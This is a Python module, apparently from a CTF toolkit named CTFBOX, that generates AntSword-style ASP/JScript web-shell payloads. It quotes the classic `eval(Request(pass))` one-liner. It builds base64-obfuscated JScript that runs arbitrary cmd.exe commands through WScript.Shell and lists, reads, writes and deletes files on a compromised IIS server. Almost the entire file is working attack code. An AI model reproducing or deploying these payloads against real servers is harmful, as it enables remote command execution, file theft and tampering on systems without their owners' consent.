"""蚁剑 ASP 载荷（JScript / Classic ASP 源码字符串形式）。

蚁剑 ASP 一句话形如 `<%eval(Request(pass))%>`；本引擎渲染 JScript 段，
沿用 `->|` / `|<-` 标记与 `/*CTFBOX_AS|...*/` 标签约定。
"""

from __future__ import annotations

import base64

from ...base import Operation


def _b64(value: str | bytes) -> str:
    data = value.encode("utf-8") if isinstance(value, str) else value
    return base64.b64encode(data).decode("ascii")


def _tag(op: str, *b64parts: str) -> str:
    return "/*CTFBOX_AS|" + "|".join((op, *b64parts)) + "*/"


def _wrap(tag: str, body: str, marker: tuple[str, str]) -> str:
    start, end = marker
    return (
        f"{tag}\n"
        f'var o="";\n'
        f"{body}\n"
        f'Response.Write("{start}");Response.Write(o);Response.Write("{end}");'
    )


def render(operation: str, params: dict, marker: tuple[str, str]) -> str:
    if operation == Operation.SYSINFO:
        tag = _tag(Operation.SYSINFO)
        body = (
            'var sh=Server.CreateObject("WScript.Shell");'
            'var fso=Server.CreateObject("Scripting.FileSystemObject");'
            'var cwd=fso.GetAbsolutePathName(".").replace(/\\\\/g,"/");'
            'o="{\\"os\\":\\"Windows\\",\\"user\\":\\""+sh.ExpandEnvironmentStrings("%USERNAME%")+"\\",\\"cwd\\":\\""+cwd+"\\"}";'
        )
        return _wrap(tag, body, marker)

    if operation == Operation.EXEC:
        b = _b64(params["cmd"])
        tag = _tag(Operation.EXEC, b)
        body = (
            f'var enc="{b}";'
            'var c="";var pad=(enc.length%4)?4-(enc.length%4):0;'
            'var xml=Server.CreateObject("Microsoft.XMLDOM");var node=xml.createElement("b64");'
            'node.dataType="bin.base64";node.text=enc;'
            'var bytes=node.nodeTypedValue;var stream=Server.CreateObject("ADODB.Stream");'
            'stream.Type=1;stream.Open();stream.Write(bytes);stream.Position=0;stream.Type=2;stream.Charset="utf-8";'
            'c=stream.ReadText();stream.Close();'
            'var sh=Server.CreateObject("WScript.Shell");var exec=sh.Exec("cmd.exe /c "+c);'
            'o=exec.StdOut.ReadAll();'
        )
        return _wrap(tag, body, marker)

    if operation == Operation.LIST:
        b = _b64(params.get("path", "."))
        tag = _tag(Operation.LIST, b)
        body = (
            f'var enc="{b}";'
            'var xml=Server.CreateObject("Microsoft.XMLDOM");var node=xml.createElement("b64");'
            'node.dataType="bin.base64";node.text=enc;'
            'var stream=Server.CreateObject("ADODB.Stream");stream.Type=1;stream.Open();stream.Write(node.nodeTypedValue);'
            'stream.Position=0;stream.Type=2;stream.Charset="utf-8";var p=stream.ReadText();stream.Close();'
            'var fso=Server.CreateObject("Scripting.FileSystemObject");var f=fso.GetFolder(p);var sb="";'
            'var e=new Enumerator(f.SubFolders);for(;!e.atEnd();e.moveNext()){var it=e.item();sb+=it.Name+"\\tdir\\t0\\n";}'
            'e=new Enumerator(f.Files);for(;!e.atEnd();e.moveNext()){var it=e.item();sb+=it.Name+"\\tfile\\t"+it.Size+"\\n";}'
            'o=sb;'
        )
        return _wrap(tag, body, marker)

    if operation == Operation.READ:
        b = _b64(params["path"])
        tag = _tag(Operation.READ, b)
        body = (
            f'var enc="{b}";'
            'var xml=Server.CreateObject("Microsoft.XMLDOM");var node=xml.createElement("b64");'
            'node.dataType="bin.base64";node.text=enc;'
            'var stream=Server.CreateObject("ADODB.Stream");stream.Type=1;stream.Open();stream.Write(node.nodeTypedValue);'
            'stream.Position=0;stream.Type=2;stream.Charset="utf-8";var p=stream.ReadText();stream.Close();'
            'var rs=Server.CreateObject("ADODB.Stream");rs.Type=1;rs.Open();rs.LoadFromFile(p);'
            'var out=Server.CreateObject("Microsoft.XMLDOM").createElement("b64");out.dataType="bin.base64";'
            'out.nodeTypedValue=rs.Read();o=out.text;rs.Close();'
        )
        return _wrap(tag, body, marker)

    if operation == Operation.WRITE:
        bp = _b64(params["path"])
        bc = params["content"]
        tag = _tag(Operation.WRITE, bp, bc)
        body = (
            f'var enc="{bp}";var enc2="{bc}";'
            'var xml=Server.CreateObject("Microsoft.XMLDOM");var node=xml.createElement("b64");'
            'node.dataType="bin.base64";node.text=enc;'
            'var st=Server.CreateObject("ADODB.Stream");st.Type=1;st.Open();st.Write(node.nodeTypedValue);'
            'st.Position=0;st.Type=2;st.Charset="utf-8";var p=st.ReadText();st.Close();'
            'var node2=xml.createElement("b64");node2.dataType="bin.base64";node2.text=enc2;'
            'var out=Server.CreateObject("ADODB.Stream");out.Type=1;out.Open();out.Write(node2.nodeTypedValue);'
            'out.SaveToFile(p,2);out.Close();'
            'o=String(node2.nodeTypedValue.length);'
        )
        return _wrap(tag, body, marker)

    if operation == Operation.DELETE:
        b = _b64(params["path"])
        tag = _tag(Operation.DELETE, b)
        body = (
            f'var enc="{b}";'
            'var xml=Server.CreateObject("Microsoft.XMLDOM");var node=xml.createElement("b64");'
            'node.dataType="bin.base64";node.text=enc;'
            'var stream=Server.CreateObject("ADODB.Stream");stream.Type=1;stream.Open();stream.Write(node.nodeTypedValue);'
            'stream.Position=0;stream.Type=2;stream.Charset="utf-8";var p=stream.ReadText();stream.Close();'
            'var fso=Server.CreateObject("Scripting.FileSystemObject");try{fso.DeleteFile(p);o="1";}catch(e){o="0";}'
        )
        return _wrap(tag, body, marker)

    raise ValueError(f"蚁剑 ASP 载荷不支持操作：{operation}")
